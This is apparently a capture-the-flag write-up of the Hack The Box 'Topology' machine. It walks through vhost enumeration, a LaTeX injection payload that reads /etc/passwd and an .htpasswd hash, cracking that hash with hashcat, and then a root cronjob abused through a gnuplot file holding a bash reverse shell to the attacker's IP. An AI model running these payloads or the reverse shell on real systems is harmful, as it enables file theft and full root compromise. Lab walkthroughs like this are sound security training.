# HTB - Topology

#### Ip: 10.129.158.218
#### Name: Topology
#### Rating: Easy

------------------------------------------------

Topology.png

#### Enumeration

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the `--min-rate 5000` flag to speed things up. I'll also use the `-sC` and `-sV` to use basic Nmap scripts and to enumerate versions:

```
┌──(ryan㉿kali)-[~/HTB/Topology]
└─$ sudo nmap -p- --min-rate 5000 -sC -sV 10.129.158.218
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2025-02-27 16:02 CST
Nmap scan report for 10.129.158.218
Host is up (0.070s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 dcbc3286e8e8457810bc2b5dbf0f55c6 (RSA)
|   256 d9f339692c6c27f1a92d506ca79f1c33 (ECDSA)
|_  256 4ca65075d0934f9c4a1b890a7a2708d7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Miskatonic University | Topology Group
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.63 seconds
```

Looking at the site we find a page for a university mathematics department:

htb_topology_site.png

The site has a link for "LaTeX Equation Generator - create .PNGs of LaTeX equations in your browser" which attempts to forward to latex.topology.htb, so let's add that to `/etc/hosts`.

Let's also scan for more VHOSTS before enumerating this further:

```
┌──(ryan㉿kali)-[~/HTB/Topology]
└─$ ffuf -u http://topology.htb -H 'HOST: FUZZ.topology.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt  -fw 1612 -mc all

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://topology.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.topology.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response words: 1612
________________________________________________

[Status: 401, Size: 463, Words: 42, Lines: 15, Duration: 76ms]
    * FUZZ: dev

[Status: 200, Size: 108, Words: 5, Lines: 6, Duration: 73ms]
    * FUZZ: stats
```

Cool, two more VHOSTS, let's add these to `/etc/hosts` as well.

The dev page requires authentication, which we don't have yet, and the stats page seems to just offer server load stats, with no real information.

Now visiting the Latex site we find a LaTex Equation Generator:

htb_topology_latex.png

Entering one of the site's examples we find:

htb_topology_example.png

Looking at the webpage root we find a few files we can download:

htb_topology_index.png

Checking out the header.tex file we find the site is using listings, which may give us access to other files:

htb_topology_header.png

### Exploitation

Researching more about this I find: https://ctan.org/pkg/listings?lang=en which mentions using `\lstinputlisting` for file reads.

But trying something like: `\lstinputlisting[/etc/passwd` continues to fail.

Heading over to trusty HackTricks and looking up LaTex injection we find a helpful note:

```
You might need to adjust injection with wrappers as [ or $.
```
So with these we can now wrap our command in `$` symbols like: `$\lstinputlisting{/etc/passwd}$` and successfully read the file:

htb_topology_etc.png

Searching for interesting files, I finally find an `.htpasswd` file for the dev site discovered earlier:

htb_topology_hash.png

Let's crack this using Hashcat:

```
┌──(ryan㉿kali)-[~/HTB/Topology]
└─$ hashcat hash /usr/share/wordlists/rockyou.txt --user
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
==========================================================================================================================================
* Device #1: pthread--0x000, 1403/2870 MB (512 MB allocatable), 1MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR) | FTP, HTTP, SMTP, LDAP Server

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

<SNIP>

$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0:calculus20          
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
```

Cool, we now have the credentials `vdaisley:calculus20`

We can use this to SSH in and grab the user.txt flag:

```
┌──(ryan㉿kali)-[~/HTB/Topology]
└─$ ssh vdaisley@10.129.158.218
```

htb_topology_user.png

### Privilege Escalation

Poking around the box we find a directory called gnuplot in `/opt`:

```
vdaisley@topology:~$ cd /opt
vdaisley@topology:/opt$ ls
gnuplot
vdaisley@topology:/opt$ file gnuplot/
gnuplot/: directory
vdaisley@topology:/opt$ cd gnuplot/
vdaisley@topology:/opt/gnuplot$ ls
ls: cannot open directory '.': Permission denied
```

According to http://www.gnuplot.info/:

```
Gnuplot is a portable command-line driven graphing utility for Linux, Windows, macOS, OS/2, VMS, and other platforms.
```

Loading Pspy64 to the target to view running cronjobs, we see several jobs run by root coming out of the gnuplot directory:

htb_topology_cron.png


I'm particularly interested in the following cronjob:

```
/bin/sh -c find "/opt/gnuplot" -name "*.plt" -exec gnuplot {} \; 
```

This folder is interesting because while we can't list files, we can write to it:

```
vdaisley@topology:/opt/gnuplot$ ls
ls: cannot open directory '.': Permission denied
vdaisley@topology:/opt/gnuplot$ touch test.txt
vdaisley@topology:/opt/gnuplot$ echo "hi" > test.txt
vdaisley@topology:/opt/gnuplot$ cat test.txt
hi
vdaisley@topology:/opt/gnuplot$ ls -la
ls: cannot open directory '.': Permission denied
```

So because the cronjob above is using wildcards and executing with gnuplot any `.plt` files, let's create one called shell.plt which will be executed with root permissions when the job runs:

```
system "bash -c 'bash -i >& /dev/tcp/10.10.14.162/443 0>&1'"
```

htb_topology_shell.png

Nice, we can now grab the final flag:

htb_topology_root.png

Thanks for following along!

-Ryan

-----------------------------------------